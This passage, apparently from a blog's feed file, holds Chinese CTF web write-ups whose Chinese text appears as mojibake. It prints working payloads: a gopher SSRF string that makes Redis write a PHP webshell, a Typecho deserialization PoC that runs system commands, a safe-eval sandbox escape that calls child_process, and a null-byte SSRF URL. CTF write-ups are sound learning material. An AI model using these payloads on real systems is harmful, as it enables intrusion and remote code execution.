¹ç›®å½•ä¹Ÿå¹¶ä¸å¯è¡Œã€‚ä½†åŸºäºè¿™é‡Œæ˜¯ä¸ªcurlçš„ssrfã€‚é‚£ä¹ˆå°±å¤§æœ‰å¯ä¸ºã€‚<br>ä¸è¿‡è¿™ä¸€æ­¥æµªè´¹äº†ä¸å°‘æ—¶é—´,åé¢æ‰ååº”è¿‡æ¥å¯ä»¥é¡ºç€æ¢å†…ç½‘ã€‚<br>å°è¯•ç›´æ¥é¡ºç€ipæ¢å†…ç½‘å­˜æ´»ä¸»æœº,å‘ç°173.92.140.13,æç¤ºå…¶ä»–ç«¯å£,çŒœæµ‹æ˜¯redisæˆ–è€…mysqlä¹‹ç±»çš„ã€‚<br>äºæ˜¯æ¢6379ç«¯å£å¾—åˆ°redisçš„æŠ¥é”™å‘½ä»¤ã€‚é‚£ä¹ˆåŸºæœ¬å¯ä»¥ç¡®è®¤æ˜¯gopheråè®®åˆ©ç”¨ssrfæ‰“redisæœªæˆæƒgetshelläº†ã€‚<br>å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« <a href="https://xz.aliyun.com/t/1800" target="_blank" rel="noopener">Rediså’ŒSSRF</a></p><p>å‘½ä»¤çš„æ„å»ºä¸»è¦æ˜¯ç¼–ç é—®é¢˜ã€‚æŠŠå‘½ä»¤è¿›è¡Œæ­£ç¡®ç¼–ç å°±èƒ½æ‰“äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;173.92.140.13:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±åœ¨140.13é‚£å†™å…¥webshellã€‚ç„¶åç›´æ¥<code>173.92.140.13/shell.php?cmd=cat%20/flag</code>å³å¯</p><h2 id="EZä¸‰å‰‘å®¢-EzTypecho"><a href="#EZä¸‰å‰‘å®¢-EzTypecho" class="headerlink" title="EZä¸‰å‰‘å®¢-EzTypecho"></a>EZä¸‰å‰‘å®¢-EzTypecho</h2><p>è¿™é¢˜çœŸçš„å¯æƒœã€‚æ¯”èµ›æ—¶å› ä¸ºå…¶ä»–é¢˜ç›®æ²¡æ¥å¾—åŠçœ‹ã€‚ç»“æœå‘ç°åŸºæœ¬å°±æ˜¯åŸæœ¬çš„é“¾å­åŠ ä¸Šä¸€ä¸ªbypasså°±è¡Œäº†ã€‚</p><p>å…ˆæ¥è¿‡ä¸‹æºç ã€‚å…³äºtypeechoçš„æ´å‡ºåœ¨install.phpç®—æ˜¯æ¯”è¾ƒç†ŸçŸ¥çš„äº†ã€‚æ‰€ä»¥ç½‘ä¸ŠåŸºæœ¬ä¸¤ä¸ªç‰ˆæœ¬çš„POPé“¾ã€‚å¦‚æœæœ‰install.phpå°±å¯ä»¥æŒ‰ç¬¬ä¸€ä¸ªçš„æ€è·¯èµ°ã€‚<br>é¦–å…ˆè¿™é‡Œçš„æºç è¡¨æ˜å¿…é¡»get<code>finish</code>å‚æ•°ä»¥åŠå¸¦ä¸ŠRefereræ‰ä¸ä¼šé€€å‡ºã€‚<br><img src="/2020/05/24/GKCTF2020writeup/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥æ˜¯ååºåˆ—åŒ–ç‚¹<br><img src="/2020/05/24/GKCTF2020writeup/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿™é‡Œå®é™…ä¸ŠåªåŠ ä¸Šäº†ä¸€ä¸ªsessionçš„åˆ¤æ–­ã€‚å¦‚æœä»¥å‰æœ‰ç°æˆçš„pocbypassäº†è¿™ä¸ªåˆ¤æ–­å°±èƒ½ç›´æ¥æ‰“äº†ã€‚è¿™é‡Œè‡ªå·±å…ˆæŒ‰ç…§é“¾å­è·Ÿä¸€ä¸‹ã€‚</p><p>ä¸Šé¢æˆ‘ä»¬çš„åºåˆ—åŒ–æ•°æ®è¢«é€è¿›å®ä¾‹åŒ–äº†ä¸€ä¸ªTypeecho_Dbç±»é‡Œã€‚è·Ÿè¿›ä¸‹<br>å‘ç°æ„é€ æ–¹æ³•è°ƒç”¨äº†<code>call_user_func()</code><br><img src="/2020/05/24/GKCTF2020writeup/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ç„¶åcall_user_funcçš„å‚æ•°<code>$adapterName</code>æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥ã€‚é‚£è¯´æ˜å¯ä»¥è§¦å‘<code>__toString</code>.æˆ‘ä»¬å…¨å±€æ‰¾ä¸‹<code>__toString</code><br>æ‰¾åˆ°<code>var\Typecho\Feed.php</code><br>å…¶é­”æœ¯æ–¹æ³•ä¸­æœ‰è¿™æ ·ä¸€æ®µ<br><img src="/2020/05/24/GKCTF2020writeup/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿™é‡Œitemæ˜¯éå†<code>items</code>å¾—æ¥çš„ã€‚è€Œitemså¯æ§ã€‚å¹¶ä¸”ç”±äºç®­å¤´æ‰€æŒ‡ä½ç½®è°ƒç”¨äº†<code>screenname</code>å±æ€§ã€‚å› æ­¤å¯èƒ½å¯ä»¥è§¦å‘<code>__get</code>æ–¹æ³•<br>å…¨å±€æœæ‰¾åˆ°<code>var\Typecho\Request.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œgetæ˜¯<br><img src="/2020/05/24/GKCTF2020writeup/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æˆ‘ä»¬ä¸Šé¢è¦è§¦å‘<code>__get</code>,æ˜¯å› ä¸ºè°ƒç”¨äº†<code>screneName</code>å±æ€§ã€‚é‚£ä¹ˆè§¦å‘getçš„è¯å°±æ˜¯å¯¹åº”äº†<code>$key</code>ã€‚å¯ä»¥çœ‹åˆ°æœ€åè¢«é€è¿›<code>_applyFilter</code>çš„å‚æ•°å€¼æ¥è‡ª<code>params[$key]</code>ä»ç„¶æ˜¯å¯æ§çš„<br>æœ€åå°±æ˜¯è·Ÿè¿›å‡½æ•°äº†ã€‚å‘ç°è°ƒç”¨<code>call_user_func</code>å¯ä»¥å‘½ä»¤æ‰§è¡Œã€‚å‚æ•°å¯æ§ã€‚æ‰€ä»¥é“¾å­åˆ°æ­¤ç»“æŸã€‚<br><img src="/2020/05/24/GKCTF2020writeup/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'cat /flag'</span>);</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'system'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items=<span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">"author"</span>=&gt;<span class="keyword">new</span> Typecho_Request()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$config=<span class="keyword">array</span>(<span class="string">"adapter"</span>=&gt;<span class="keyword">new</span> Typecho_Feed(),<span class="string">"prefix"</span>=&gt;<span class="string">'byc'</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($config));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€åå†å›åˆ°å¼€å§‹æåˆ°çš„é—®é¢˜ã€‚æƒ³è¦è§¦å‘ååºåˆ—åŒ–å¿…é¡»è¦æœ‰ä¸ªsession.ä¸è¿‡å…¶å®ä¹Ÿæœ‰å¥½å‡ é“é¢˜è®¾åŠåˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹ã€‚æˆ‘ä»¬åˆ©ç”¨phpçš„ç‰¹æ€§ã€‚å¸¦ä¸Š<code>php_session_upload_progress</code>ä¸Šä¼ æ–‡ä»¶ã€‚å¹¶ä¸”cookieå¸¦ä¸ŠPHPSESSIDã€‚å°±ä¼šå‘ç°ä¸ä¼šè§¦å‘å®ƒæç¤º<code>no, you can&#39;t unserialize it without session QAQ</code>äº†<br>ç»“æœ<br><img src="/2020/05/24/GKCTF2020writeup/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å½“ç„¶è¿™é¢˜ä¸æŒ‰è¿™ä¸ªæ€è·¯æ¥ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚å› ä¸ºgetä¼ å‚<code>start</code>å¤„ä¹Ÿæœ‰ä¸€ä¸ªååºåˆ—åŒ–ã€‚ç›´æ¥æ‰“ä¹Ÿæ²¡é—®é¢˜ã€‚æ€»ä¹‹è¿™é¢˜èŠ±çš„æ—¶é—´æ˜¯æœ€çŸ­çš„,æ¯”èµ›æ—¶æ²¡åšçœŸçš„å¯æƒœã€‚</p><h2 id="EZä¸‰å‰‘å®¢-EzNode"><a href="#EZä¸‰å‰‘å®¢-EzNode" class="headerlink" title="EZä¸‰å‰‘å®¢-EzNode"></a>EZä¸‰å‰‘å®¢-EzNode</h2><p>è¿™é¢˜è·Ÿä¹‹å‰åšnpuctfæ—¶çš„ä¸€é“nodeå·®ä¸å¤šã€‚ä¸è¿‡è¿™é‡Œç›´æ¥ç”¨çš„<code>safe-eval</code>åº“ã€‚æ˜¾ç„¶æ˜¯æœ‰pocå¯é€ƒé€¸çš„ã€‚ä½†æ˜¯åœ¨è¿™ä¹‹å‰è‚¯å®šæœ‰wafè¦ç»•ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">'/eval'</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 è€æ¿è¯´è®©æˆ‘ä¼˜åŒ–ä¸€ä¸‹é€Ÿåº¦ï¼Œæˆ‘å°±ç›´æ¥è¿™æ ·å†™äº†ï¼Œå…¶ä»–äººå†™äº†å•¥å…³æˆ‘päº‹</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'timeout'</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">'Timeout!'</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œsettimoutä¼šå‘ç°å¯¼è‡´æˆ‘ä»¬çš„payloadéƒ½æ— æ³•æ‰§è¡Œã€‚å› æ­¤éœ€è¦ç»•è¿‡,è®©delayå°äº1000æ‰èƒ½è¿›åˆ°safeevalçš„è·¯ç”±é‡Œã€‚<br><a href="https://stackoverflow.com/questions/3468607/why-does-settimeout-break-for-large-millisecond-delay-values" target="_blank" rel="noopener">https://stackoverflow.com/questions/3468607/why-does-settimeout-break-for-large-millisecond-delay-values</a><br>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªissueã€‚å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„delayå¦‚æœå¤§å°è¶…è¿‡32ä½ï¼Œä¼šè¢«<code>settimeout</code>è®¾ä¸º1.è¿™æ ·å°±æ»¡è¶³æ¡ä»¶äº†ã€‚<br>åé¢æœåˆ°çš„safe-evalçš„pocç›´æ¥æ‰“</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> theFunction = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> f = Buffer.prototype.write;</span><br><span class="line">  <span class="keyword">const</span> ft = &#123;</span><br><span class="line">    length: <span class="number">10</span>,</span><br><span class="line">    utf8Write()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      x = r(i);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(x)!==<span class="string">'number'</span>)</span><br><span class="line">      <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">if</span>(x!==i)</span><br><span class="line">      <span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      f.call(ft);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">      <span class="keyword">return</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> i=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      i=r(i).constructor.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">      i++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i.mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"id"</span>).toString()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`(<span class="subst">$&#123;theFunction&#125;</span>)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(saferEval(untrusted));</span><br></pre></td></tr></table></figure><p>æ”¹æˆIIFEå½¢å¼ç›´æ¥æ‰“ã€‚</p><p><code>(function(){xxxxx})()</code><br><img src="/2020/05/24/GKCTF2020writeup/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="CVEç‰ˆç­¾åˆ°"><a href="#CVEç‰ˆç­¾åˆ°" class="headerlink" title="CVEç‰ˆç­¾åˆ°"></a>CVEç‰ˆç­¾åˆ°</h2><p>è¿™é¢˜æˆ‘æ˜¯çœŸçš„æ²¡ç†è§£å‡ºé¢˜äººçš„æ„æ€ã€‚åé¢æé†’äº†CVEåè¿˜æ˜¯æ²¡ç†è§£å‡ºé¢˜äººçš„æ„æ€â€¦â€¦ç»“æœå¤§éƒ¨åˆ†æ—¶é—´éƒ½èŠ±åœ¨è¿™é¢˜ä¸Šäº†ã€‚</p><p>è¿›å»åä¼¼ä¹æ˜¯ä¸€ä¸ªssrfã€‚ç„¶ååªæœ‰<code>.ctfhub.com</code>æ‰ä¼šè§¦å‘åŠ¨ä½œçš„æ ·å­ã€‚å› æ­¤åˆ¤æ–­åº”è¯¥æ˜¯æœ‰ä¸ªæ­£åˆ™äº†ã€‚ç„¶åå‘ç°headeré‡Œæç¤ºflagåœ¨localhost,å¹¶ä¸”Hostè¦ä»¥123ç»“å°¾ã€‚</p><p>è¿™é‡Œæˆ‘è™½ç„¶å¤§æ¦‚æ˜ç™½åç«¯è¿è¡Œæµç¨‹ï¼Œä½†æ˜¯è¿˜æ˜¯æé”™äº†å‡ºé¢˜äººçš„æ„å›¾ã€‚å¤ªéš¾å—äº†ã€‚è¿ç”¨åˆ°çš„CVEå…¶å®å°±æ˜¯getheaderçš„CVEã€‚ä¹‹å‰BJDåˆšåˆšè€ƒè¿‡ã€‚è¿™ä¸ªå‡½æ•°ç‰¹ç‚¹å°±æ˜¯ä¼šå»è¯·æ±‚å¹¶è¿”å›header.ä½†æ˜¯CVEå‘Šè¯‰æˆ‘ä»¬,å¦‚æœæ˜¯ç”¨%00æˆªæ–­,å°±å¯èƒ½è®©å‘½ä»¤å»è¯·æ±‚ç”¨æˆ·çš„å¯æ§ç½‘å€ã€‚</p><p>åœ¨äº†è§£åˆ°è¿™ä¸ªCVEåï¼Œæˆ‘ä»¥ä¸ºæ˜¯è¦è¿”å›å¤´é‡Œçš„Hostä¸º123ç»“æŸã€‚ç»“æœæœ€åæ‰çŸ¥é“åŸæ¥æ˜¯è¦è¯·æ±‚<code>127.0.0.123</code>ã€‚ã€‚ã€‚ä¸çŸ¥é“è¯´å•¥,åªèƒ½è¯´è‡ªå·±æŠŠæç¤ºææˆè¦ç»•çš„wafäº†ã€‚<br>payload<br><code>url=http://127.0.0.123%00.ctfhub.com</code></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™æ¬¡æ¯”èµ›è™½ç„¶åé¢åŸºæœ¬å°±æ²¡èŠ±æ—¶é—´äº†ï¼Œä½†æ˜¯æ”¶è·æŒºå¤§çš„.è‡³å°‘å‘ç°è‡ªå·±ä¸´åœºå˜é€šçš„èƒ½åŠ›è¿˜æ˜¯å¾ˆå·®å°±è·Ÿå¹³æ—¶å­¦ä¸šä¸€æ ·â€¦ä¸è¿‡è¿˜æ˜¯å¾—ç¨³æ‰ç¨³æ‰“å§ã€‚æœ€åè¿˜å‰©ä¸€åœºRCTFè¿™ä¸ªå­¦æœŸå°±è¦æš‚æ—¶è·ŸCTFè¯´å†è§äº†ã€‚äº‰å–èƒ½å†å‘æŒ¥çš„ç¨³ä¸€ç‚¹ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯-é’é¾™ç»„-WEB-writeup</title>
      <link href="2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/"/>
      <url>2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/</url>
      
        <content type="html"><![CDATA[<p>ç½‘é¼é’é¾™ç»„æˆåŠŸæŒºè¿›çº¿ä¸‹,å½“ç„¶è¦æ„Ÿè°¢é˜Ÿå‹ä»¬çš„ç»™åŠ›å‘æŒ¥,X1cä¸¤åªé˜Ÿä¹Ÿèƒ½æˆåŠŸä¼šå¸ˆåŠå†³èµ›äº†.(å°±æ˜¯å¯¹æˆ‘è¿™æ ·çš„awdå°ç™½è€Œè¨€ä¼°è®¡åˆæ˜¯å»å½“ç‚®ç°äº†)</p><p>è¯´ä¸‹æ¯”èµ›æ„Ÿå—å§ã€‚è€å®è¯´webæ‰‹æ¯”èµ›ä½“éªŒå¹¶ä¸å¥½ã€‚å¼€èµ›åˆ°12ç‚¹æ‰å‡ºç°ç¬¬ä¸€é“WEBé¢˜.è€Œè¿™ä¹‹å‰å”¯ä¸€ä¸€ä¸ªç­¾åˆ°é¶æœºé¢˜æˆ‘å¼€äº†ä¸€ä¸ªå°æ—¶éƒ½æ˜¯åçš„â€¦<br>ç„¶åæ˜¯æ¯”èµ›æ°›å›´,è€å®è¯´æ˜çœ¼äººåº”è¯¥éƒ½çœ‹å¾—å‡ºæ¥äº†ã€‚ä¸­é—´pyä»€ä¹ˆçš„å°±ä¸å¤šè¯´äº†ã€‚javaé‚£é¢˜æˆ‘çœ¼çççœ‹ç€5åˆ†é’Ÿå†…æ¶¨äº†å‡ åè§£ã€‚è‡³äºå…¶ä»–å‡ ä¸ªäºŒè¿›åˆ¶çš„é¢˜æ›´ä¸ç”¨æ,åšå‡ºæ¥çš„äººæ•°å°±æ˜¯é“è¯äº†ã€‚æœ€åäº”åˆ†é’Ÿå†…ï¼Œåå‡ ç§’æ—¶é—´æˆ‘ä»¬é˜Ÿæ‰äº†åå¤šåç„¶ååˆè¹¦å›æ¥äº†å°±å¾ˆè¿·ã€‚<br>ç„¶ååŠ¨æ€é¶æœºä¸€é˜Ÿåªèƒ½å¼€ä¸€ä¸ª,è€å®è¯´å¾ˆå¤§ç¨‹åº¦ä¸ŠæŸç¼šäº†å¼€é¢˜çš„èŠ‚å¥ã€‚</p><p>æ¯”èµ›éš¾åº¦å€’è¿˜èƒ½æ¥å—ã€‚æŒ‰éƒå¸ˆå‚…è¯´çš„,è¿™æ¬¡æ²¡ak webä¸å¤ªåº”è¯¥ã€‚å½“ç„¶å…¶å®æ˜¯æœ€åçœ‹ç€åªå‰©10å¤šåˆ†é’Ÿæ—¶åæ¬¡ç¨³äº†å°±åšä¸åŠ¨äº†.èµ›åå¤ç°æœ€åä¸€ä¸ªé¢˜æ—¶ä¹Ÿå‘ç°ç¡®å®ä¸æ”¹å®Œæ²¡åšå‡ºæ¥çš„ã€‚æ€»ä¹‹è¿™é‡ŒæŠŠæ‰€æœ‰WEBé¢˜è§£éƒ½è®°å½•ä¸‹å§ã€‚</p><a id="more"></a><h1 id="AreUserialize"><a href="#AreUserialize" class="headerlink" title="AreUserialize"></a>AreUserialize</h1><p>ä»Šæ—¥ç„å­¦é¢˜ã€‚é¦–å…ˆæ˜¯æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 